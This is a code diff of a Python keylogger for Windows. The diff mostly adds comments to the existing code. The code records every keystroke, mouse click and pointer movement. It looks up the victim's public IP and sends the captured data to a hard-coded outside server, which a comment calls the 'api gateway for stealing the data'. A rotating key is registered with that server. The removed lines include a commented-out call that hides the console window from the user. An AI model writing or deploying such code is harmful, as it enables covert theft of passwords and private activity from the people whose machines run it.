@@ -13,38 +13,41 @@ import os
 import time
 import threading
 
-#os.startfile(r"C:\Users\User\sampleBatch.bat")
+#creates a random key
 def key_generator(size= 10, chars=string.ascii_lowercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 #getting the current window the app is running
 myWindow = win32console.GetConsoleWindow()
-#hiding it from the user
-#win32gui.ShowWindow(myWindow, 0)
+#variable holding the global current x,y
 currentX =0
 currntY=0
 #variable holding the global stream
 dataStream = ""
 #api gateway for stealing the data
 apiUrl = 'http://3.17.7.99/api/sendData/'
+#api gateway for key
 apiKeyUrl= 'http://3.17.7.99/api/secretkey/'
+#getting the current pc's IP
 ip = requests.get(r'http://jsonip.com').json()['ip']
 key = key_generator()
 keyTime = datetime.datetime.now()
+#sends data using the API gateway
 id = requests.post(url=apiKeyUrl, data={'key':key, 'source':ip}).json()['id']
-#for sending data at 10 second intervals (can be changed)
-#getting the current pc's IP
-#checks time and if it hits 10 seconds activates sendData and resets the timer
-
+#checks time and ip 
 def checkCondition():
     global id, keyTime, ip, key
     curr_time = datetime.datetime.now()
+    #checks the ip
     if ip != requests.get(r'http://jsonip.com').json()['ip']:
         ip= requests.get(r'http://jsonip.com').json()['ip']
+    #creats new key every 300 seconds
     if (curr_time - keyTime).seconds >=300:
         key = key_generator()
         response = requests.put(url='{0}{1}/'.format(apiKeyUrl,id), data={'key':key, 'source':ip})
+    #if it hits 15 seconds activates sendData and resets the timer
     if len(dataStream) > 15:
         sendData()
+#activates the checkCondition every 10 seconds
 def threadFunc():
     while(True):
         time.sleep(10)
@@ -70,10 +73,8 @@ def on_move(x,y):
         currentY = y
         mouseLog = 'Pointer moved to {0}'.format((x,y))
         dataStream +='\n'+mouseLog
-        #if len(dataStream)-currentLen >= 30:
-        #checkCondition()
     return True
-
+#parses the mouse click event and adds it to the datastream
 def mouseClick(x,y,event,pressed):
     global dataStream 
     currentLen = len(dataStream)
@@ -84,10 +85,7 @@ def mouseClick(x,y,event,pressed):
     if event == mouse.Button.middle:
         mouseLog= 'middle {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
     dataStream +='\n'+mouseLog
-    #if len(dataStream)-currentLen >= 30:
-    #checkCondition()
-    return True
-    
+    return True    
 #parses the keystroke event and adds it to the datastream
 def keyStrokes(event):
     global dataStream
@@ -95,35 +93,35 @@ def keyStrokes(event):
     #if we hit escape will stop the keylogger
     if key in dataStream:
         exit(1)
+    #special keys
     if type(event) == keyboard.Key:
         if event == keyboard.Key.esc:
             dataStream += 'key(esc) '
         else:
             dataStream += event
+    #normal alphanumeric keys
     elif type(event) == keyboard.KeyCode:
         dataStream += event.char
-    #if len(dataStream)-currentLen >= 30:
-    #checkCondition()
     return True
-
+#releaseד a key
 def on_release_keyboard(event):
     return True
 
-# create a hook manager object
-    #so that when a keydown action is performed sends the event to our function
-    # set the hook
-
-    #keyhookObject
-#looping so if we get an error the keylogger wont stop
-
+#listener for keyboard events
 keyboardListener = keyboard.Listener(on_press=keyStrokes,on_release=on_release_keyboard)
+#listener for mouse events
 mouseListener = mouse.Listener(on_click=mouseClick)
 moveListener = mouse.Listener(on_move=on_move)
+#start the keyboardListener’s activity
 keyboardListener.start()
+#start the mouseListener’s activity
 mouseListener.start()
+#start the moveListener’s activity
 moveListener.start()
 dataSend= threading.Thread(target=threadFunc)
+#start the dataSend’s activity
 dataSend.start()
+#collect events until released
 keyboardListener.join()
 mouseListener.join()
 mouseListener.join()
